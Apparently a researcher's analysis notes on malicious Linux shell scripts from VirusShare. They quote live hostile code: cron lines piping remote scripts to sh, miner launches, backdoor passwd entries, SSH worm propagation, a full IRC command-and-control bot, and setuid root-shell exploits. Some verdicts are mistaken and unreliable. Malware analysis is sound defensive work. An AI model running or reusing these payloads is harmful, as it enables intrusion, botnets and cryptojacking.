# VirusShare_775b04d9458a409e82ef05fb1b3dcc95.sh

## Summary
This script stops any firewalls, configures DNS server as 8.8.8.8. 
Then, it sets `/var/spool/cron/root` to execute specific command. 
The commands are: 
```
"*/5 * * * * curl -fsSL http://185.244.25.191/i.sh | sh" 
*/5 * * * * wget -q -O- http://185.244.25.191/i.sh | sh
``` 

Then, it creates and sets `/avr/spool/cron/crontabs/root` to execute the following commands:
```
"*/5 * * * * curl -fsSL http://185.244.25.191/i.sh | sh"
"*/5 * * * * wget -q -O- http://185.244.25.191/i.sh | sh"
```
Finally, it donwloads binary into `/urs/local/lib/.zh/`, change permission, execute it in background. 

## Notes

* The downloaded binary file is named as `  `. That is, using a space as its name. 

* If `/usr/lib/local/.zh` does not exist, use `mkdir` to create and use `wget` to download. Other wise, use `curl` to download. 

--------------------------------------------------

# VirusShare_1412382920bd2a7fdeec22f6f6f7b758.sh

This looks incomplete. `infect` variable not defined. 
## Summary
If not infected do the following. 
It checks `/tmp/vir-*` If nothing exists, it executes `$0 infect &`. So, this looks a part of other script. 

During infection, it executes:
```
    tail +25 $0 >>/tmp/vir-$$
    chmod 777 /tmp/vir-$$
    /tmp/vir-$$ $@
    CODE=$?
```
It prints the first lines into `/tmp/vir-$$`. 
Change permision, 
Execute the `/tmp/vir-$$` with `$@` as prameter. 


If infected do the following.
```
    find / -type f -perm +100 -exec bash -c \
    "if [ -z \"\`cat {}|grep VIRUS\`\" ]; \
    then \
        cp {} /tmp/vir-$$; \
        (head -24 $0 >{}) 2>/dev/null; \
        (cat /tmp/vir-$$ >>{}) 2>/dev/null; \
        rm /tmp/vir-$$; \
    fi" \;
    CODE=0
```
This find the file name `bash` from root dir. 
The file type should be a file (`-type f`) and with permision `100`.
The `-exec` option is followed by a command (`bash` in this case)
Then the `bash -c` is executed with the following code. 
```
    "if [ -z \"\`cat {}|grep VIRUS\`\" ]; \
    then \
        cp {} /tmp/vir-$$; \
        (head -24 $0 >{}) 2>/dev/null; \
        (cat /tmp/vir-$$ >>{}) 2>/dev/null; \
        rm /tmp/vir-$$; \
    fi" \;
```
`{}` is replaced by the file name found by `find`. 
So, this code copies the found file to be `/tmp/vir-$$`. 
replace the found file with the first 24 lines of `$0`. 
concat the original content of the found file to the end of the found file. 

In summary, this code looks insert a 24-line code at the begining of the found file. 
The found file must contain `VIRUS` at the begining of its file. 


--------------------------------------------------

# VirusShare_eefbbb4ddf5c0c1c38f773ac0246d92e.sh

This is not an executable shell script. It is for explanation purpose. 
## Summary
IBM AIX libc MALLOCDEBUG File Overwrite Vulnerability 
Refer : securitytracker.com/id?1022261
This is a vulnerability reporeted in IBM AIX. **A local user can obtain root privilleges on the target system**



--------------------------------------------------

# VirusShare_6b24490d22d902d45e9e5379132260d9.sh 

## Summary
Remove **all** files under `/tmp/httpdlog/*.gz`
Remove **all** `.gz` and `.sh` files under current dir. 
Check whether process with `qwe15884889.01` is running. If it's running, remove everything under `/tmp/httpdlog/*.gz` and the running program, i.e., `$0`. 
Otherwise, make dir `/tmp/httpdlog` and collect system information to determine proper binary to download. 

```
typeos=`getconf LONG_BIT`
if [ "$typeos" = "64" ]
then
wget http://119.249.54.100:8846/mall.tar.gz -O my.tar.gz
fi
tar zxvf my.tar.gz
chmod 777 ./mstbcn
chmod 777 ./mstrie
chmod 777 ./mstxcn
rm -f /tmp/httpdlog/*.gz
rm -f *.gz
nohup ./mstbcn  -a cryptonight -o bcn -u qwe15884889.01 -p x -B >/dev/null 2>&1 &
nohup ./mstrie -m -o ric -u qwe15884889.02 -p x >/dev/null 2>&1 &
nohup ./mstxcn -a m7 -o bcn -u qwe15884889.01 -p x >/dev/null 2>&1 &
echo "ok"
rm -f $0
fi

```

This code checkes if the system is 64-bit or not. It does the following.
1. Use wget to download. 
2. untar
3. change permission
4. clear current dir. 
5. execute with `nohup` on background. 
6. remove this script.

## Notes

1. `getconf` is a command that prints system variables. 
2. Substitutution is often used to collect system info. 
3. Logs are removed. 
4. Script can self-remove. 


--------------------------------------------------

# VirusShare_3155860c4fcee4b076c6284f9951dca0.sh

## Summary
This is a macOS script. 
1. path `/Library/Internet Plug-Ins` is a Mac OS path. 
2. `scutil` is default installed on Mac OS but not on Linux. 
3. `/Network/Gloabl/IPv4` is a Mac OS path. 


--------------------------------------------------

# VirusShare_10e9a63082c496ebec6f0d384bbed694.sh 

## Summary
It modify the `/etc/passwd` and `/etc/shadow` file to add a guest. So that the attacker can use the credentials of that user to login later on. 
```
USER='guests:x:2012:2012::/usr/dt:/bin/sh'
MAIL='magnet@tv2mail.hu'
STRN='guests:$1$TKNjHFAo$usoR2ZazE57AWkaWf8Cpl0:11107:7:91:28:::'
WORD='753951741'
        ./xgcc;mkdir /usr/dt >>/dev/null 2>&1;
	touch /usr/dt/dtinfo;
	echo $USER >> /etc/passwd;
        echo $STRN >> /etc/shadow;
        chown guests /usr/dt;
```
This code use `mkdir` to make a user home dir. 
Then use `echo` to set pre-defined passwd and shadow to sensitive files. 
Then, `chown` of the created home dir. 
Finally, remove temperary files. 


## Notes
Touching `/etc/passwd` and `/ect/shadow` directly without using `adduser` is suspicious. 



--------------------------------------------------

# VirusShare_9e04aad6d98f86a9cbe28bbf556da91e.sh

## Summary
Set `DEBUG` variable to `/dev/null` Direct all info into `DEBUG`, i.e., `/dev/null` to achieve stealthy operation. 
**Stealthy** usually relates to `/dev/null`. 

Try to use `sudo` to run itself. 
**Itself** usually relates to `$0` directly or indirectly.

There is an **encoded** attempt. 
```
cat > $TMP1 << EOFMARKER
H4sICH7bDFkAA21pbmVyZADE/Q98VNd95w/fGY2kkTS2BxsntKFhBAIEKImISavukmSwSUoakgwY
... 
vrltnl4VS5l69a2mZ8kQT0zT0lr6l8lnL6v8Wz3Ld0ar/qHU+/KHev8L7B5+AawYDAA=
EOFMARKER
```
In this code, the `<<SOME-WORD` is used as **here document**. **Here document** is a kind of string that is used by bash (and other program languages) to make a long stream as a single word. 

Quote from [Shell Here Document Overview](https://web.archive.org/web/20140529084958/http://content.hccfl.edu/pollock/ShScript/HereDoc.htm) :

> Here documents (also called here docs) allow a type of input redirection from some following text.  This is often used to embed a short document (such as help text) within a shell script.  Using a here doc is often easier and simpler than a series of echo or printf statements.  It can also be used to create shell archives (shar files), embed an FTP (or other) script that needs to be fed to some command (such as ftp), and a few other uses.  Here docs are so useful many other languages use them, such as Perl and Windows PowerShell.

```
TMP2="/tmp/minerd"
base64 -d $TMP1 | gunzip -c > $TMP2
rm -rf $TMP1
chmod +x $TMP
```
This code **decodes** and **decompresses** the file. It also removes old file and change permission. 


```
killall bins.sh
killall minerd
killall node
killall nodejs
killall ktx-armv4l
killall ktx-i586
killall ktx-m68k
killall ktx-mips
killall ktx-mipsel
killall ktx-powerpc
killall ktx-sh4
killall ktx-sparc
killall arm5
killall zmap
```
This code kills many proceses. This is also suspecious especially it kills some important services (e.g., `ssh`, `sshd`, `iptables`). 


```
nohup $TMP2 -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 45hgMAs1sNdMs7H9aCQm8oMCG5HGg37nv9Ab5r8u4R9gcWkSteobyt6faTuV8tnzhSUH3WFmStG1YXtsvSkSo5sz2ugxSW4 >> $DEBUG &
sleep 3
rm -rf $TMP2
```
This code executes binary. 


```
echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
rm -rf /root/.bashrc
rm -rf /home/pi/.bashrc
usermod -p \$6\$U1Nu9qCp\$FhPuo8s5PsQlH6lwUdTwFcAUPNzmr0pWCdNJj.p6l4Mzi8S867YLmc7BspmEH95POvxPQ3PzP029yT1L3yi6K1 pi
for pid in `netstat -pant | grep -v "ssh" | grep -v "minerd" | grep ESTABLISHED | awk -F ' ' '{print $7}' | awk -F '/' '{print $1}'`
do
	echo $pid
	kill -9 $pid
done
```
This code modifies the known hosts. 
It removes important files `/root/.bashrc` and `/home/pi/.bashrc` 
It modifies user account `usermod`. 
It kills all established network services except `ssh` and `minere`. This is **agressive**. 


```
while [ true ]; do
	FILE=`mktemp`
	zmap -p 22 -o $FILE -n 50000
	killall ssh scp
	for IP in `cat $FILE`
	do
		sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /tmp/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
	done
	rm -rf $FILE
	sleep 5
done
```
This code first use `zmap` to do port scan. 
Then it kills `ssh` and `scp`, which means the attacker is going to leave the script running alone. 
Use `sshpass` to login to a server without password prompt. It uses `raspberry` as its password to login. 

The very long line states:
> use `scp` to upload \$MYSELF to a target (scanned) device under `/tmp/`.
Then use `ssh` to connect to that device and execute 
`cd /tmp && chmod +x $NAME && bash -c ./$NAME &` 

**This is a self propergation because $NAME and \$MYSELF is included, which depends on the program name of this shell.**



## Notes
**1. Data dependency is necessary. `/dev/null` and `$0` are highly suspicious.**
2. `realpath` prints the resolved path. E.g., `realpath $0`
3. `nohup` is used to start complex tasks remotely. 
4. `/dev/null` is used to avoid output. That is, make it silent. 
5. In some cases the **here document** is cuspicious. Especially combined with a redirect opertion (`>`), which means the stream is written into a file. 
6. **Decode** is also suspecious, especially together with **here document**
7. **Agressive** removal or killing is another indicator. 
8. **Self-propagation** is a strong evidence about the infection. This can be detected by data dependency. If a `ssh`, `scp` is observed to pass itself to another device, this is self-propagation.


-------------------------------------------------

# VirusShare_303aa62e9ce6ed3df5b4334f426b0a9f.sh

## Summary
It's straight forward. Use `wget` to download many binaries. `chmod` to change permission, and `./` to execute, finally, `rm -rf *` to remove all. 


## Notes
This infection may not so effective. It does not check folders and my other infos. 


-------------------------------------------------

# VirusShare_87934e6519091f075815d90ef8b17733.sh

This is not a complete shell. 
## Summary
It's a Vulnerability discovered by : Claudio Viviani. 


-------------------------------------------------

# VirusShare_51f96c26aa765547b0ab271f29087e4d.sh

## Summary 

This script only removes `./output.txt`, `./svcname.txt`, `./output2.txt`, `./datapool.bk` and kill `datapool.sh`. 
It also kills **ALL** programs under `./bin/*`  
```
rm -f ./output.txt ; rm -f ./svcname.txt ; rm -f ./output2.txt ; rm -f ./datapool.bk ; killall -9 -w datapool.sh 1>/dev/null 2>&1 ; for KILLER in ./bin/* ; do killall -9 -w $KILLER 1>/dev/null 2>&1 ; done ; exit $@
```



-------------------------------------------------

# VirusShare_d67051937f85da2c343e4db9d45b7962.sh 

proc defined but not used. 
## Summary
Use `nproc` to check number of processing units available. 
Use `uname -m` to print HW architecture. 
According to the type of architeture, it executes different binaries. 

## Notes
According to names **cryptonight**, it should be a **minerd** malware, which is used for cryptocurrency mining. 


-------------------------------------------------

# VirusShare_cedd8fc8279f1bf709a169159af382cc.sh

## Summary
Kill all processes you can kill by using `kill -9 -1`. Then go to `\tmp` and remove everything `rm -rf *` and `rf -rf .a`. This is aggressive. 
Then make a dir, download, change permission, execute (at background). Then download, execute, download, execute, download, execute, download.
Then remove everthing under `/tmp/su*`, which is agreesive. 
Finally change permission and execute the last downloaded binary. 

## Notes
1. `export PATH="."` is used. This may not be a good practice for software installation because it cannot preserve after logout. 
2. Aggressive kill. 
3. Agressive remove. 
4. Match the DW-CH-EXE pattern. 



-------------------------------------------------

# VirusShare_e941392698dbbab4221b0bec79d5b09f.sh

## Summary
Go to /tmp, download, execute, remove,
download, change permission, execute, remove,
download, change permission, execute, remove, 
... 
download, change permission, execute, remove.


## Notes
1. This matches the DW-CH-EXE-RM pattern. 
2. It tries may differnt architectures. **But only one is expected to be successfull**. So there should be many errors (even crash). Capturing whether the program exits correctly is also an indicator for infection. 



-------------------------------------------------

# VirusShare_bc586c343e2c4ae96142620140bcbb5f.sh 

## Summary
This is the "boring" pattern. But it begins with `(` at each line, so that this code is not identified as "boring". But natrually, they are the same. 




-------------------------------------------------

# VirusShare_20df64b90591d464b2bc7abaac7f4a8e.sh 

It looks like this is a script that exploits the buffer overflow vulnerability of a FTP server. 

## Summary

Print a "hard-coded" piece of code using `echo` and `perl`. Then read from the standard input using `cat -`. 
Finally, pipe this to a `nc 0 21` command, which meas connect to a local FTP server. 


## Notes
The hard-coded code is in hex format. 



-------------------------------------------------

# VirusShare_52267a182a0d25831ab9cbd8b7825f76.sh 

This script seems under development. Because some commands are commented out. 

## Summary
It downloads the named Mirai binaries from a URL. 


## Notes
It also matches the DW-CH-EXE-RM pattern.



-------------------------------------------------

# VirusShare_557607ea0f6c5c0a7448ac2a2a4552f1.sh 

This looks like a modified version of other scripts. Because it comments out some commands and add something. 

## Summary
Set the `PATH` and `SHELL` variable, but does not `export` them to make them effective. 
Identify whether the caller of this script is a `root`. If it's a root user, it will set the cron.
```
  echo "*/5 * * * * curl -fsSL http://e3sas6tzvehwgpak.tk/r88.sh|sh" > /var/spool/cron/root
  mkdir -p /var/spool/cron/crontabs
  echo "*/5 * * * * curl -fsSL http://e3sas6tzvehwgpak.tk/r88.sh|sh" > /var/spool/cron/crontabs/root
```

After that, it downloads using `curl`, change permission, execute. 
If the previous does not run successfully, it download using `wget`, change permission, and execute. 


## Notes
Not a well written script. E.g., the if is duplicated. 



-------------------------------------------------

# VirusShare_9d6b6554d50841b322dd1aa64966414a.sh

This script looks a little bit innocent because it does not have DW-CH-EXE-RM chain. 

## Summary
Get current place using `pwd`. 
`echo` a hard-coded data and redirect it to `data.file`. 
`cat` the `data.file` and use that output as the parmater of `curl -d` to a URL. 
Finally, it exeuctes two scripts `./sparky.sh 192.168` and `./rand > /dev/null &`. 
It removes the `data.file`. 


## Notes
1. hard-coded stuff is usually suspecious. Because benign users don't use that, they have more convenience to read from a file, or execute specific client program. In addition, normal users don't want to expose sensitive info in the command line history. 


-------------------------------------------------

# VirusShare_7392ef495b243c80f3973845d0ada6f1.sh

This script is called `## cdrdaohack.sh by Jens "atomi" Steube` 
cdrdao is a project: Disk-At-Once Recording of Audio and Data CD-Rs/CD-RWs
It looks like a demo. 

## Summary
1. It set some paths, `/etc/cron.d/cdr`, `/usr/bin/cdrdao`, and `$HOME/.cdrdao`. 
2. Then it test the path of `cdrdao`. 
3. Then it uses `cat` to write a hard-coded code of C into a file `/tmp/dash.c`. 
4. It uses `cat` to write a hard-coded code of shell into a file `/tmp/dao.sh`. 
5. It Change permission. 
6. Backup original file (this is not suspicious)
7. make symlink using `ln -s`. 
8. Execute `cdrdao`, which is a normal program. 
9. Wait `/tmp/daosh` to set-user-id is set. 
10. execute `/tmp/daosh`. 

The `/tmp/daosh` is as follows.
```
cc -o /tmp/daosh /tmp/daosh.c >/dev/null 2>&1
chown root /tmp/daosh >/dev/null 2>&1
chgrp root /tmp/daosh >/dev/null 2>&1
chmod 6755 /tmp/daosh >/dev/null 2>&1
exit 0
```
It compiles `/tmp/daosh.c` and changes the permission. 

The source code of `/tmp/dash.c` is as follows.
```
int main () { 
setuid(0); setgid(0);
unlink("/tmp/dao.sh");
unlink("/tmp/daosh.c");
unlink("/etc/cron.d/cdr");
unlink("$HOME/.cdrdao");
execl("/bin/bash","bash","-i",0);
}
```
This code set uid to root. The `unlink` systemcall deletes a file name from the file system (removing evidence?). 
The `execl` system call replace the current process image with a specified image (`/bin/bash` in this case).  
`bash -i 0` means run `bash` in interactive mode and using the standard input as the input. 


# Notes
1. This looks like a demonstration of the vulnerability of `cdrdao`. It seems the `cdrdao` can make the shell to be executed in root. 
2. It does not match DW-CH-EXE-RM pattern completely. What it looks like is change permission and execute a C program. 


----------------------------------------------------------


# VirusShare_254b779e82c8662bea67f5b01eb47473.sh 

This is a "boring" pattern. 

## Summary
This matches the FP-DW-CH-EXE pattern. 




----------------------------------------------------------

# VirusShare_d99d03417e7a4a51902eb37b52b6c1c6.sh 


This is a "boring" pattern. 

## Summary
This matches the FP-DW-CH-EXE pattern. 



----------------------------------------------------------

# VirusShare_742f247c9ff393f8daf2e1609f0d9506.sh 

This is very similar to 
> VirusShare_9e04aad6d98f86a9cbe28bbf556da91e.sh

The following just lists some difference between to scripts. 

## Summary
**If the user is not root, this script copy itself to `/op/` and rewrite `/etc/rc.local` to execute itself and reboot immediately.**
More info about `/ect/rc.local` in respberrypi could be found here:
[https://www.raspberrypi.org/documentation/linux/usage/rc-local.md](https://www.raspberrypi.org/documentation/linux/usage/rc-local.md)

After that, some descriminations include:
1. Creates a `/root/.ssh`
2. Writes a public key to the `/root/.ssh/authorized_keys`
3. Writes a public key to `/tem/public.perm`. 
4. Sets DNS server to `8.8.8.8`
5. Remove some files under `/tmp/` and `/var/`, but not aggressive. 
6. An encoded bash is written to `/tmp/$BOT`. 
7. change permission to `/tmp/$BOT`
8. execute `/tmp/$BOT`
9. remove log file (nohup.log) and output file (nohup.out)
10. remove `/tmp/$BOT`. 
11. run `zmap`, kill `ssh` and `scp`. 
12. use sshpass to login to another device and propagate itsself. 
13. delete extra files.


## Notes
I list the common parts here.
1. Get the name of current program.
2. Redirect outputs to `/dev/null` 
3. kill all other malware
4. Use `sshpass` to **propagate** through infinit loop. 
5. kill every `ssh` and `scp` during propagate
6. matches CH-EXE-RM. Note, 
> change permission, exe, and rm 
are usually not used in the update process. This is because, updates don't execute immediately or remove downloaded files. 

7. Hard-coded code is a strong evidence showing that this is an infection. 

## Appendix

#### ***This is a very smart C&C client***

This is the code of `/tmp/$BOT`
```
#!/bin/bash

SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
NICK=a${SYS:24}
while [ true ]; do

	arr[0]="ix1.undernet.org"
	arr[1]="ix2.undernet.org"
	arr[2]="Ashburn.Va.Us.UnderNet.org"
	arr[3]="Bucharest.RO.EU.Undernet.Org"
	arr[4]="Budapest.HU.EU.UnderNet.org"
	arr[5]="Chicago.IL.US.Undernet.org"
	rand=$[$RANDOM % 6]
	svr=${arr[$rand]}

	eval 'exec 3<>/dev/tcp/$svr/6667;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi

	echo $NICK

	eval 'printf "NICK $NICK\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi
	eval 'printf "USER user 8 * :IRC hi\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
		continue
	fi

	# Main loop
	while [ true ]; do
		eval "read msg_in <&3;"

		if [[ ! "$?" -eq 0 ]] ; then
			break
		fi

		if  [[ "$msg_in" =~ "PING" ]] ; then
			printf "PONG %s\n" "${msg_in:5}";
			eval 'printf "PONG %s\r\n" "${msg_in:5}" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
			sleep 1
			eval 'printf "JOIN #biret\r\n" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
		elif [[ "$msg_in" =~ "PRIVMSG" ]] ; then
			privmsg_h=$(echo $msg_in| cut -d':' -f 3)
			privmsg_data=$(echo $msg_in| cut -d':' -f 4)
			privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)

			hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
			sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`

			if [[ "$sign" == "$hash" ]] ; then
				CMD=`echo $privmsg_data | base64 -d -i`
				RES=`bash -c "$CMD" | base64 -w 0`
				eval 'printf "PRIVMSG $privmsg_nick :$RES\r\n" >&3;'
				if [[ ! "$?" -eq 0 ]] ; then
					break
				fi
			fi
		fi
	done
done
EOFMARKER
```
This code first get the MD5 check sum of the `uname -a` output.
Then set `NICK` as `a` plus the last 8 character of the md5. 
The it gets in an infinite loop.The loop:
1. choose a host randomly
2. `3<>/dev/tcp/$svr/6667` opens a file (`/dev/tcp/$svr/6667` in this case) on the file descriptor (`3` in this case) in read-write mode. `exec` will execute a file (relates to `/dev/tcp/$svr/6667` in this case)
3. print `$NICK`, and some other info. Then go into *main loop*
4. It reads from `/dev/tcp/$svr/6667`
5. This main loop looks like a server, receiving message from and send to `/dev/tcp/$svr/6667`. 
6. This server tries to verify the openssl key to ensure its **integrity**. 
7. If it matches, it decodes the message to get a command. Then use `bash -c` to execute that command, whose output is sent to `base64 -w 0`.
8. The decoded content is printed out to the remote side through `/dev/tcp/$svr/6667`


----------------------------------------

# VirusShare_a9d0748af3f639ef480a326a562cb479.sh 

According to the comment, this is a SSH22 Scanner By YupY-BoG & GodZilla TEAM !


## Summary

This script runs an unknown program `./pscan2` and `./ssh-scan 100`. 
It removes the file it generates completely. 


---------------------------------------------

# VirusShare_05eda75e7e1337d3e64a96495309296c.sh 

## Summary
1. Define a bard-coded C file that copies the current file to the `/bin/bash`. 
2. Compile the file. 
3. Save the old environment variable `RSHSAVE=$RSH`
4. Use the `./cpbinbash` as the environment. I guess this is to trigger an exploit of `cdrecord` program. The comments of this script also indicates this. 
5. Run `cdrecrod`.
6. Retrive the environment variable `RSH=$RSHSAVE`, and remove internal files. 
7. Execute local `./bash`, which is copied from `/bin/bash` by `./cpbinbash`. Because the `cdrecord` has root privilege, so the copied `./bash` has that privilege and also with `setuid` bit set. So the normal user can use this bash as a root. 
8. 

## Notes
1. hard-coded file is suspicious
2. remove after execution is very suspicious. 
3. The cdrecord is reported to have vulnerabilities:
> CVE-2005-0866, CVE-2004-0806, CVE-2003-0289. 

4. New command (program) cdrecord. If a vulnerable command is executed then it has chance to be an infection. Usually for preparing the environment. 


------------------------------------------------------

# VirusShare_cdec0fbc4b154f5e91a835b64e59791b.sh

## Summary
This is the boring pattern. 
1. CD to `/tmp` 
2. Try both `wge` and `curl` with the same URLs to download binaries. 
3. Change permission
4. Execute
5. sleep
6. Agressively remove everthing under `/tmp/`. This also removes the executables after executing them. 


------------------------------------------------------

# VirusShare_af371b8592aa4914473d18e7afaa36fd.sh 

This script does not look like for infection purpose. 
It looks like for damage purpose. 

## Summary
1. List all files under current dir. 
2. copy current script to (possibly overwrite) `._startup`, `._local` file and chenge permission for them. 
3. It also copies itself to many places under `$HOME` and some other places.
4. It removes `*.doc`, `*.xls`, `*.pdf`, `*.dbf`, `*.mdb`, `*.sql`. This looks like removing all data. 
5. Download a file. 
6. Run `kdialog`, a program for GUI. 
7. exeute `wall`, a program that sends message to every other users. 
8. exeute `lp`, a program to send files to printers to print. 


## Notes
1. This looks like copying this file to a place where the script will be executed automatically during startup. **Note that, we can use data dependency to check whether this file has copy itself or not.**
2. **New command `wall`**
3. **New command `lp`**



------------------------------------------------------

# VirusShare_9c0fd9e804e88ae5b600a4b3132bad07.sh 

This is a script for Mac OS. Because the path is `/Library`

## Summary
1. It includes hard-coded script. 



------------------------------------------------------

# VirusShare_3b3b7a7e51d60a09e0c0e54f48b2b2db.sh 


## Summary
1. Go to `/var/tmp` and download, change permission, execute. Delete the string of "bins" in the `/etc/hosts` to avoid tracking. 
2. Get current file name. 
3. Use a hard-coded file. 
4. Decode (`base64`) and unzip (`gunzip`) the file
5. remove temp file
6. change permission
7. kill similar process (`minerd`)
8. Execute and remove the executable immediately.
9. create a new account
10. remove **aggressively** all the processes. 
11. launch port scan `zamp`. 
12. use `sshpass` to self-propagate. 


## Notes
1. Execute the file at the background and remove it immediately after execution is super suspicious. 
2. Port scanning is suspicious. DW-CH-EXE-RM-Scanning is even more suspicious.


----------------------------------------------------------------

# VirusShare_cca56aebb39a9b4aae240732164104d9.sh


## Summary
1. check whether `soffta` has been installed. 
2. If installed, write a shell code in-place, change permission, and schedule it in crontab
3. If not installed, copy current script to `/tmp/soffta`, change permission, execute it. 


## Notes
1. In-place code writing is an indicator of infeciton. 
#### **How to know whether a file is created by in-place code writing?**
##### The answer is that writing to a file and execute immediately is a in-place writing.

2. There is a self-propagate.
3. This code may execute multiple times. It is possible to infer that this program try to access a file, and then try to write to it in the next execution. 

#### **It is worth noting, self propagation is possible to be capture by system call level signal.**


------------------------------------------------------------

# VirusShare_23ec53aff40259ab0fd78cf64f4b3a21.sh 


## Summary
1. Remove a the `/usr/lib/libfl.so` if it exists. Then email the connent of the removed file to an email address. 
2. If `/usr/sbin/apmd` is not there, copy `/usr/lib/.egcs/apmd` to `/usr/sbin/apmd`. Remove `/ect/rc.d/rc3.d/S16apmd`. Make a symlink for `/ect/rc.d/rc3.d/S16amp` pointing to `/usr/sbin/apmd`. 
3. Execute `/usr/sbin/apmd`


## Notes
1. There is a piece of commented out code. Those code download a file, unzip it, execute `./go`. I guess the `./go` file is this script. 

**2. There are multiple ways to execute a file.**
1). `./` to execute
2). add it to `cron`
3). copy it to `/ect/rc.d`
4). make a symlink and execute the symlink

3. New command `apmd` for advanced power management daemon


----------------------------------------------------------

# VirusShare_989edc1edd131eadaf25584716669d29.sh 

This script look like an innocent script.

## Summary
1. Lookup DNS for "chaos" with TXT records. 
2. Execute `./bind` or `./x496` according to the response of the DNS record. 
3. remove temp file. 



## Notes
1. New command `dig` for DNS lookup. 
2. If not because of "vuln" (I guess short for vulnerability), I cannot say this is a malicious script. 



----------------------------------------------------------

# VirusShare_2883000f680c3c2ec6aca3bb663a04fe.sh 

This script is obscure. 

## Summary
1. Some parameters are set.
2. Use `curl` to donwload a file. 
3. Read and check the file. 
4. execute a binary (not a downloaded one) `./haiduc` using the donwloaded file and some other pre-defined variables as arguments. 
5. Download a php file. 
6. Use `pkill` and `killall` to kill the just executed binary. **This does not look like infection since infection does not kill itself.**
7. download using `curl` and execute `php`.
8. Use `pkill` and `killall` to kill `haiduc` agian. 
9. remove temp files. 


## Notes
It's hard to say this file is malicious. 
1. The `./haicud` porgram is similar to `ssh`. 
2. The `php` is executed may be because of its vulnerability. However, we cannot see any further exploitation, such as copying file, launching bash. So, this may not exploit `php`'s vulnerability. 



----------------------------------------------------------

# VirusShare_8ce21b79623d575b2d85321808187400.sh 

This is just a single line of the "boring" pattern. FP-DW-CH-EXE



----------------------------------------------------------

# VirusShare_84e39576777d1556cdc87a30d541b7c7.sh 

This looks like a innocent script because it has its copyright on 2014. 

## Summary
This script uses `dirname` and `basename` under itself. Then it runs a gdb-style tool. 



----------------------------------------------------------

# VirusShare_e158c98a90cc7b14d026443cbcd8b520.sh 

This script may be copied or modified from other scripts. 

## Summary
1. Set variables and pats. 
2. Check whether the caller is `root` or not. 
3. If it's not `root`, Download using `curl` a file to `/tmp/lower.sh`, change permission, execute it on background. Then if download fails, it use `wget` to downlaod `/tmp/lowerv2.sh`, change permission, execute it on background. 
4. Otherwise, it set a donwload command (`curl`) in the `/var/spool/cron/root`, and `/var/spool/cron/crontabs/root`. Download using `curl` a file to `/tmp/root.sh`, change permission, execute it on bg. Then if download fails, it uses `wget` to download `/tmp/rootv2.sh`, change permission and execute it on bg. 


# Note
1. This script does not remove downloaded file after execution. 



----------------------------------------------------------

# VirusShare_c2474337dd6546c348d51083af731262.sh 

This is the fourth time I observe this (similar) file.
> VirusShare_9e04aad6d98f86a9cbe28bbf556da91e.sh 

and some other.

## Summary
1. find the path of itself. 
2. redirect the output to `/dev/null` to avoid printing. 
3. Check whether the caller is `root`. 
4. If it's not `root`, copy itself to `/etc/rc.local` and reboot. 
5. If it's `root` Then do the following. 
6. Kill a list of processes (not agressive)
7. remove `/root/.bashrc` and `/home/pi/.bashrc`, then use `usermod` to create a new account `pi`. 
8. Prepare public key. 
9. Use hard-coded file. (very sucpicious)
10. Another piece of hard-coded file (named $BOT). 
11. Write the code to a file, change permission, execute the code, remove the file ($BOT)
12. run port scan, 
13. run killall `ssh` and `scp`
14. self-propagate.


---------------------------------------------------------

# VirusShare_cfd699501ba0834cd88a1c79fd038fb1.sh

```
#!/bin/bash
#
# March 27 2002
#
# logwatch211.sh
#
# Proof of concept exploit code
# for LogWatch 2.1.1
# Waits for LogWatch to be run then gives root shell
# For educational purposes only
#
# (c) Spybreak <spybreak@host.sk>
```

## Summary
1. Get pids, execute `/tmp/logwatch.$2/cron`. 
2. Modify `/etc/passwd`. 
3. Modify `/etc/shadow`. 
4. Switch to the newly added user(`master`)


## Notes
This script looks totally OK. It looks like this script is installing some program and run the program. I cannot see any infection-specific operations. 
That is, it does not download, not remove, not propagate.





